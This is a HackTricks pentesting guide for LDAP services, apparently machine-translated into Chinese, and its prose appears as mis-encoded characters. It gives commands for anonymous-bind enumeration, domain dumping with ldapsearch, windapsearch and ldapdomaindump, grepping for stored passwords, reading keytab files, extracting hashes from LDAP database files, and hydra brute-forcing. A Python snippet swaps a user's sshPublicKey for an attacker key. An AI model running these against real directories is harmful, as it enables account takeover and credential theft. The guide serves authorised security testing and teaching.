# 389, 636, 3268, 3269 - LDAP æ¸—é€æµ‹è¯•

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–**å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

LDAPï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰ä¸»è¦ç”¨äºåœ¨ç½‘ç»œä¸­å®šä½å®ä½“ï¼Œå¦‚ç»„ç»‡ã€ä¸ªäººå’Œå„ç§èµ„æºï¼ˆä¾‹å¦‚æ–‡ä»¶ã€è®¾å¤‡ï¼‰ã€‚è¿™å¯ä»¥æ˜¯åœ¨äº’è”ç½‘ç­‰å…¬å…±å¹³å°ä¸Šï¼Œä¹Ÿå¯ä»¥æ˜¯åœ¨ç§äººå†…éƒ¨ç½‘ç»œä¸­ã€‚ä½œä¸ºç›®å½•è®¿é—®åè®®ï¼ˆDAPï¼‰çš„ç®€åŒ–ç‰ˆæœ¬ï¼ŒLDAP å…·æœ‰è¾ƒå°çš„ä»£ç å ç”¨ç©ºé—´ã€‚

LDAP ç›®å½•çš„ç»“æ„å…è®¸å…¶åˆ†å¸ƒåœ¨å¤šä¸ªæœåŠ¡å™¨ä¸Šã€‚åœ¨è¿™äº›æœåŠ¡å™¨çš„æ¯ä¸ªä¸Šï¼Œæ•´ä¸ªç›®å½•çš„å¤åˆ¶å½¢å¼å­˜åœ¨ï¼Œå¹¶ä¸”ä¼šå®šæœŸè¿›è¡ŒåŒæ­¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒLDAP æœåŠ¡å™¨è¢«ç§°ä¸ºç›®å½•ç³»ç»Ÿä»£ç†ï¼ˆDSAï¼‰ã€‚å½“ç”¨æˆ·å‘ LDAP æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå¯¹è¯¥è¯·æ±‚è´Ÿå…¨éƒ¨è´£ä»»ã€‚è¿™æ¶‰åŠä¸å…¶ä»– DSA è¿›è¡Œé€šä¿¡ï¼ˆå¦‚æœéœ€è¦ï¼‰ï¼Œä½†æ›´é‡è¦çš„æ˜¯ï¼Œå®ƒç¡®ä¿ç”¨æˆ·æ”¶åˆ°å•ä¸€ã€è¿è´¯çš„å“åº”ã€‚

LDAP ç›®å½•çš„ç»„ç»‡ç±»ä¼¼äºç®€å•çš„â€œæ ‘â€å±‚æ¬¡ç»“æ„ï¼ŒåŒ…æ‹¬å‡ ä¸ªçº§åˆ«ï¼š

- æœ€é«˜çº§åˆ«æ˜¯æ ¹ç›®å½•ï¼Œå……å½“æ ‘çš„èµ·æºæˆ–æºå¤´ã€‚
- è¿™åˆ†æ”¯åˆ°ä¸‹ä¸€ä¸ªçº§åˆ«ï¼Œå³å›½å®¶ã€‚
- æ¯ä¸ªå›½å®¶è¿›ä¸€æ­¥åˆ†ä¸ºç»„ç»‡ã€‚
- ç»„ç»‡åˆ†ä¸ºç»„ç»‡å•ä½ã€‚è¿™äº›å•ä½å¯ä»¥ä»£è¡¨ä¸åŒçš„éƒ¨é—¨æˆ–éƒ¨é—¨ã€‚
- æœ€åä¸€çº§åŒ…æ‹¬ä¸ªä½“å®ä½“ã€‚è¿™ä¸ä»…åŒ…æ‹¬äººå‘˜ï¼Œè¿˜åŒ…æ‹¬æ–‡ä»¶å’Œæ‰“å°æœºç­‰å…±äº«èµ„æºã€‚

**é»˜è®¤ç«¯å£ï¼š** 389 å’Œ 636ï¼ˆldapsï¼‰ã€‚å…¨å±€ç›®å½•ï¼ˆActiveDirectory ä¸­çš„ LDAPï¼‰é»˜è®¤åœ¨ç«¯å£ 3268 ä¸Šæä¾›ï¼ŒLDAPS åˆ™åœ¨ç«¯å£ 3269 ä¸Šæä¾›ã€‚
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAPæ•°æ®äº¤æ¢æ ¼å¼

LDIFï¼ˆLDAPæ•°æ®äº¤æ¢æ ¼å¼ï¼‰å°†ç›®å½•å†…å®¹å®šä¹‰ä¸ºä¸€ç»„è®°å½•ã€‚å®ƒè¿˜å¯ä»¥è¡¨ç¤ºæ›´æ–°è¯·æ±‚ï¼ˆæ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤ã€é‡å‘½åï¼‰ã€‚
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* ç¬¬1-3è¡Œå®šä¹‰äº†é¡¶çº§åŸŸlocal
* ç¬¬5-8è¡Œå®šä¹‰äº†ç¬¬ä¸€çº§åŸŸmoneycorpï¼ˆmoneycorp.localï¼‰
* ç¬¬10-16è¡Œå®šä¹‰äº†2ä¸ªç»„ç»‡å•ä½ï¼šdevå’Œsales
* ç¬¬18-26è¡Œåˆ›å»ºäº†ä¸€ä¸ªåŸŸå¯¹è±¡ï¼Œå¹¶åˆ†é…äº†å¸¦æœ‰å€¼çš„å±æ€§

## å†™å…¥æ•°æ®

è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å¯ä»¥ä¿®æ”¹å€¼ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿæ‰§è¡Œéå¸¸æœ‰è¶£çš„æ“ä½œã€‚ä¾‹å¦‚ï¼Œæƒ³è±¡ä¸€ä¸‹ï¼Œæ‚¨**å¯ä»¥æ›´æ”¹æ‚¨çš„ç”¨æˆ·æˆ–ä»»ä½•ç”¨æˆ·çš„"sshPublicKey"ä¿¡æ¯**ã€‚å¦‚æœå­˜åœ¨è¿™ä¸ªå±æ€§ï¼Œé‚£ä¹ˆ**sshå¾ˆå¯èƒ½æ­£åœ¨ä»LDAPè¯»å–å…¬é’¥**ã€‚å¦‚æœæ‚¨å¯ä»¥ä¿®æ”¹ç”¨æˆ·çš„å…¬é’¥ï¼Œå³ä½¿åœ¨sshä¸­æœªå¯ç”¨å¯†ç èº«ä»½éªŒè¯ï¼Œæ‚¨**ä¹Ÿå°†èƒ½å¤Ÿä»¥è¯¥ç”¨æˆ·èº«ä»½ç™»å½•**ã€‚
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## çªƒå–æ˜æ–‡å‡­è¯

å¦‚æœLDAPåœ¨æ²¡æœ‰SSLçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œæ‚¨å¯ä»¥åœ¨ç½‘ç»œä¸­**çªƒå–æ˜æ–‡å‡­è¯**ã€‚

æ­¤å¤–ï¼Œæ‚¨å¯ä»¥åœ¨LDAPæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„ç½‘ç»œä¸­æ‰§è¡Œ**ä¸­é—´äººæ”»å‡»**ã€‚åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥è¿›è¡Œ**é™çº§æ”»å‡»**ï¼Œä½¿å®¢æˆ·ç«¯ä½¿ç”¨**æ˜æ–‡å‡­è¯**è¿›è¡Œç™»å½•ã€‚

**å¦‚æœä½¿ç”¨SSL**ï¼Œæ‚¨å¯ä»¥å°è¯•è¿›è¡Œ**ä¸­é—´äººæ”»å‡»**ï¼Œå°±åƒä¸Šé¢æåˆ°çš„é‚£æ ·ï¼Œä½†æä¾›ä¸€ä¸ª**ä¼ªè¯ä¹¦**ï¼Œå¦‚æœ**ç”¨æˆ·æ¥å—**å®ƒï¼Œæ‚¨å¯ä»¥é™çº§è®¤è¯æ–¹æ³•å¹¶å†æ¬¡æŸ¥çœ‹å‡­è¯ã€‚

## åŒ¿åè®¿é—®

### ç»•è¿‡TLS SNIæ£€æŸ¥

æ ¹æ®[**è¿™ç¯‡æ–‡ç« **](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ï¼Œåªéœ€ä½¿ç”¨ä»»æ„åŸŸåï¼ˆå¦‚company.comï¼‰è®¿é—®LDAPæœåŠ¡å™¨ï¼Œä»–å°±èƒ½å¤Ÿä»¥åŒ¿åç”¨æˆ·çš„èº«ä»½è”ç³»LDAPæœåŠ¡å¹¶æå–ä¿¡æ¯ï¼š
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAPåŒ¿åç»‘å®š

[LDAPåŒ¿åç»‘å®š](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled)å…è®¸**æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…**ä»åŸŸä¸­æ£€ç´¢ä¿¡æ¯ï¼Œä¾‹å¦‚å®Œæ•´çš„ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€ç”¨æˆ·å¸æˆ·å±æ€§å’ŒåŸŸå¯†ç ç­–ç•¥åˆ—è¡¨ã€‚è¿™æ˜¯ä¸€ä¸ª**ä¼ ç»Ÿé…ç½®**ï¼Œè‡ªWindows Server 2003èµ·ï¼Œåªæœ‰ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·æ‰è¢«å…è®¸å‘èµ·LDAPè¯·æ±‚ã€‚\
ç„¶è€Œï¼Œç®¡ç†å‘˜å¯èƒ½éœ€è¦**è®¾ç½®ç‰¹å®šåº”ç”¨ç¨‹åºä»¥å…è®¸åŒ¿åç»‘å®š**å¹¶æä¾›æ¯”é¢„æœŸæ›´å¤šçš„è®¿é—®æƒé™ï¼Œä»è€Œä½¿æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·å¯ä»¥è®¿é—®ADä¸­çš„æ‰€æœ‰å¯¹è±¡ã€‚

## æœ‰æ•ˆå‡­æ®

å¦‚æœæ‚¨æœ‰æœ‰æ•ˆå‡­æ®ç™»å½•LDAPæœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è½¬å‚¨æœ‰å…³åŸŸç®¡ç†å‘˜çš„æ‰€æœ‰ä¿¡æ¯ï¼š

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [æš´åŠ›ç ´è§£](../generic-methodologies-and-resources/brute-force.md#ldap)

## æšä¸¾

### è‡ªåŠ¨åŒ–

ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œæ‚¨å°†èƒ½å¤ŸæŸ¥çœ‹**å…¬å…±ä¿¡æ¯**ï¼ˆå¦‚åŸŸåï¼‰**ï¼š**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>ä½¿ç”¨Pythonè¿›è¡ŒLDAPæšä¸¾</summary>

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨Python**å¸¦æœ‰æˆ–ä¸å¸¦æœ‰å‡­æ®æšä¸¾LDAP**ï¼š`pip3 install ldap3`

é¦–å…ˆå°è¯•**æ— éœ€**å‡­æ®è¿æ¥ï¼š
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
å¦‚æœå“åº”ä¸º `True`ï¼Œå°±åƒå‰é¢çš„ç¤ºä¾‹ä¸€æ ·ï¼Œæ‚¨å¯ä»¥ä» LDAP æœåŠ¡å™¨ä¸­è·å–ä¸€äº›**æœ‰è¶£çš„æ•°æ®**ï¼ˆå¦‚**å‘½åä¸Šä¸‹æ–‡**æˆ–**åŸŸå**ï¼‰ï¼š
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
ä¸€æ—¦æ‚¨è·å¾—å‘½åä¸Šä¸‹æ–‡ï¼Œæ‚¨å¯ä»¥è¿›è¡Œä¸€äº›æ›´ä»¤äººå…´å¥‹çš„æŸ¥è¯¢ã€‚è¿™ä¸ªç®€å•çš„æŸ¥è¯¢åº”è¯¥å‘æ‚¨æ˜¾ç¤ºç›®å½•ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼š
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
æˆ–è€…**è½¬å‚¨**æ•´ä¸ªldapï¼š
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) æ˜¯ä¸€ä¸ªä½¿ç”¨ LDAP æŸ¥è¯¢æ¥æšä¸¾ Windows åŸŸä¸­çš„ç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœºçš„ Python è„šæœ¬ã€‚
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

æ£€æŸ¥ç©ºå‡­æ®æˆ–éªŒè¯æ‚¨çš„å‡­æ®æ˜¯å¦æœ‰æ•ˆï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
å¦‚æœå‘ç°æœ‰å…³â€œ_bindå¿…é¡»å®Œæˆ_â€çš„å†…å®¹ï¼Œæ„å‘³ç€å‡­æ®ä¸æ­£ç¡®ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æå–**åŸŸä¸­çš„æ‰€æœ‰å†…å®¹**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
æå–**ç”¨æˆ·**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
æå–**è®¡ç®—æœº**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå–**æˆ‘çš„ä¿¡æ¯**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå– **Domain Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå–**åŸŸç”¨æˆ·**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå–**Enterprise Admins**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå– **Administrators**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå–**è¿œç¨‹æ¡Œé¢ç»„**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
è¦æŸ¥çœ‹æ˜¯å¦æœ‰è®¿é—®å¯†ç ï¼Œæ‚¨å¯ä»¥åœ¨æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ä¹‹åä½¿ç”¨grepï¼š
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
#### pbis

æ‚¨å¯ä»¥ä»è¿™é‡Œä¸‹è½½**pbis**ï¼š[https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/)ï¼Œé€šå¸¸å®‰è£…åœ¨`/opt/pbis`ç›®å½•ä¸‹ã€‚\
**Pbis**å…è®¸æ‚¨è½»æ¾è·å–åŸºæœ¬ä¿¡æ¯ï¼š
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## å›¾å½¢ç•Œé¢

### Apache Directory

[**ä»è¿™é‡Œä¸‹è½½Apache Directory**](https://directory.apache.org/studio/download/download-linux.html)ã€‚æ‚¨å¯ä»¥åœ¨[è¿™é‡Œæ‰¾åˆ°å¦‚ä½•ä½¿ç”¨æ­¤å·¥å…·çš„ç¤ºä¾‹](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s)ã€‚

### jxplorer

æ‚¨å¯ä»¥åœ¨æ­¤å¤„ä¸‹è½½å¸¦æœ‰LDAPæœåŠ¡å™¨çš„å›¾å½¢ç•Œé¢ï¼š[http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

é»˜è®¤å®‰è£…åœ¨ï¼š_/opt/jxplorer_

![](<../.gitbook/assets/image (22) (1).png>)

### Godap

æ‚¨å¯ä»¥åœ¨[https://github.com/Macmod/godap](https://github.com/Macmod/godap)è®¿é—®å®ƒ

## é€šè¿‡kerberosè¿›è¡Œèº«ä»½éªŒè¯

ä½¿ç”¨`ldapsearch`ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨å‚æ•°`-Y GSSAPI`æ¥**å¯¹kerberosè¿›è¡Œèº«ä»½éªŒè¯**ï¼Œè€Œä¸æ˜¯é€šè¿‡**NTLM**è¿›è¡Œèº«ä»½éªŒè¯

## POST

å¦‚æœæ‚¨å¯ä»¥è®¿é—®åŒ…å«æ•°æ®åº“çš„æ–‡ä»¶ï¼ˆå¯èƒ½åœ¨_/var/lib/ldap_ä¸­ï¼‰ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æå–å“ˆå¸Œå€¼ï¼š
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
### é…ç½®æ–‡ä»¶

* é€šç”¨
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 æœåŠ¡å™¨
* V3.sas.oc
* Microsoft Active Directory æœåŠ¡å™¨
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP ç›®å½•æœåŠ¡å™¨
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
LDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. LDAP is a "lightweight" (smaller amount of code) version of Directory Access Protocol (DAP).

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**]æ”¶è—å“ï¼Œ[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
